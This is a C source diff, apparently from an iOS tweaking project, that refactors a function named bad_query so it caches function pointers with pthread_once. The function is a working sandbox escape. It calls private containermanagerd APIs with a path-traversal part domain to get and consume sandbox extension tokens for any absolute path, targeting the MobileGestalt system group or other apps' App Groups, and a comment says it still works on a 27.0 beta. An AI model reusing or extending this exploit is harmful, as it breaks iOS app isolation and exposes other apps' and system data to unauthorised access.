@@ -12,6 +12,7 @@
 #include <stdlib.h>
 #include <errno.h>
 #include <string.h>
+#include <pthread.h>
 #include <sys/stat.h>
 #include <xpc/xpc.h>
 
@@ -30,6 +31,45 @@ typedef char *(*container_copy_sandbox_token_fn)(void *);
 typedef int64_t (*sandbox_extension_consume_fn)(const char *);
 typedef int (*sandbox_extension_release_fn)(int64_t);
 
+// ---- 函数指针缓存：bad_query 可能被高频调用，每次 dlopen + 10 次 dlsym 开销太大。
+// 用 pthread_once 一次性解析并常驻 dylib（不 dlclose，系统库常驻无副作用）。
+// Swift 侧已将全部调用串行化，这里再加 once 锁保证初始化线程安全。
+static pthread_once_t bq_once = PTHREAD_ONCE_INIT;
+static void *bq_mgr = NULL;
+static container_query_create_fn q_create;
+static container_query_set_class_fn q_set_class;
+static container_query_set_identifiers_fn q_set_group_identifiers;
+static container_query_set_flags_fn q_set_flags;
+static container_query_set_part_fn q_set_part;
+static container_query_set_part_domain_fn q_set_part_domain;
+static container_query_get_single_result_fn q_get_single_result;
+static container_query_free_fn q_free;
+static container_copy_sandbox_token_fn q_copy_sandbox_token;
+static sandbox_extension_consume_fn q_consume;
+static sandbox_extension_release_fn q_release;
+
+static void bq_resolve_once(void) {
+    bq_mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+    if (!bq_mgr) return;
+    q_create = (container_query_create_fn)dlsym(bq_mgr, "container_query_create");
+    q_set_class = (container_query_set_class_fn)dlsym(bq_mgr, "container_query_set_class");
+    q_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(bq_mgr, "container_query_set_group_identifiers");
+    q_set_flags = (container_query_set_flags_fn)dlsym(bq_mgr, "container_query_operation_set_flags");
+    q_set_part = (container_query_set_part_fn)dlsym(bq_mgr, "container_query_operation_set_part");
+    q_set_part_domain = (container_query_set_part_domain_fn)dlsym(bq_mgr, "container_query_operation_set_part_domain");
+    q_get_single_result = (container_query_get_single_result_fn)dlsym(bq_mgr, "container_query_get_single_result");
+    q_free = (container_query_free_fn)dlsym(bq_mgr, "container_query_free");
+    q_copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(bq_mgr, "container_copy_sandbox_token");
+    q_consume = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+    q_release = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
+}
+
+static int bq_symbols_ready(void) {
+    return bq_mgr && q_create && q_set_class && q_set_group_identifiers && q_set_flags
+        && q_set_part && q_set_part_domain && q_get_single_result && q_free
+        && q_copy_sandbox_token && q_consume;
+}
+
 int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
     // Sanity check our path and check if something already exists there
     if (!path || path[0] != '/') return -255; // Not an absolute path
@@ -42,110 +82,84 @@ int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group
         }
     }
     
-    // Now the fun begins
-    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
-    if (!mgr) return -1; // Failed to dlopen
-    
-    // Resolve functions
-    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
-    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
-    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
-    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
-    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
-    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
-    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
-    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
-    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
-    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
-    
-    int64_t handle = -1;
-    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
-        dlclose(mgr);
-        return -1; // Failed to resolve a function
-    }
+    pthread_once(&bq_once, bq_resolve_once);
+    if (!bq_symbols_ready()) return -1; // Failed to resolve functions
     
     // Create query
-    void *query = query_create();
-    if (!query) {
-        dlclose(mgr);
-        return -2; // Failed to create query
-    }
+    void *query = q_create();
+    if (!query) return -2; // Failed to create query
     
     // Set up query
     // Two routes here, supply an App Group you control (to access other App Groups on iOS 26) or don't, and use MobileGestalt's SystemGroup as a target instead. If targeting iOS 26 and trying to access App Groups, also set is_group to true to use the correct flags.
     xpc_object_t identifier;
     if (group_identifier == NULL) {
-        query_set_class(query, 13); // Class 13 (MCMSharedSystemDataContainer) routes to containermanagerd_system
+        q_set_class(query, 13); // Class 13 (MCMSharedSystemDataContainer) routes to containermanagerd_system
         identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
     } else {
-        query_set_class(query, 7); // Class 7 (MCMSharedDataContainer) routes to containermanagerd
+        q_set_class(query, 7); // Class 7 (MCMSharedDataContainer) routes to containermanagerd
         identifier = xpc_string_create(group_identifier);
     }
-    query_set_group_identifiers(query, identifier);
-    query_set_part(query, 3); // Part determines our starting point, part 3 is Library/Caches
+    q_set_group_identifiers(query, identifier);
+    q_set_part(query, 3); // Part determines our starting point, part 3 is Library/Caches
     char *part = NULL;
     // Oldest trick in the book. Basic path traversal.
     if (group_identifier == NULL) {
         if (asprintf(&part, "../../../../../../../..%s", path) != -1) {
-            query_set_part_domain(query, part);
+            q_set_part_domain(query, part);
         } else {
             xpc_release(identifier);
-            query_free(query);
-            dlclose(mgr);
+            q_free(query);
             return -5; // asprintf failed for some reason
         }
     } else {
         // We have to go one level higher to get to / from an App Group
         if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
-            query_set_part_domain(query, part);
+            q_set_part_domain(query, part);
         } else {
             xpc_release(identifier);
-            query_free(query);
-            dlclose(mgr);
+            q_free(query);
             return -5; // Same thing
         }
     }
     
     // To access App Groups on iOS 26, you have to use different flags, this doesn't apply on 27
     if (is_group) {
-        query_set_flags(query, 0x0000000800000000ULL);
+        q_set_flags(query, 0x0000000800000000ULL);
     } else {
-        query_set_flags(query, 0x0000008000000000ULL);
+        q_set_flags(query, 0x0000008000000000ULL);
     }
     
     // Send our query over
-    void *result = query_get_single_result(query);
+    void *result = q_get_single_result(query);
     if (!result) {
         free(part);
         xpc_release(identifier);
-        query_free(query);
-        dlclose(mgr);
+        q_free(query);
         return -3; // Outside of sandbox
     }
-    char *token = copy_sandbox_token(result);
+    char *token = q_copy_sandbox_token(result);
     if (!token) {
         free(part);
         xpc_release(identifier);
-        query_free(query);
-        dlclose(mgr);
+        q_free(query);
         return -4; // Kernel refused to issue a sandbox extension
     }
     
     // Consume our fresh sandbox extension and clean up
-    handle = consume_extension(token);
+    // dylib 常驻（函数指针缓存），不 dlclose
+    int64_t handle = q_consume(token);
     free(token);
     free(part);
     xpc_release(identifier);
-    query_free(query);
+    q_free(query);
     
-    dlclose(mgr);
     return handle;
 }
 
 void bad_query_release(int64_t handle) {
     if (handle < 0) return;
-    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
-    if (release_extension) release_extension(handle);
+    pthread_once(&bq_once, bq_resolve_once);
+    if (q_release) q_release(handle);
 }
 
 // This still works on 27.0b5
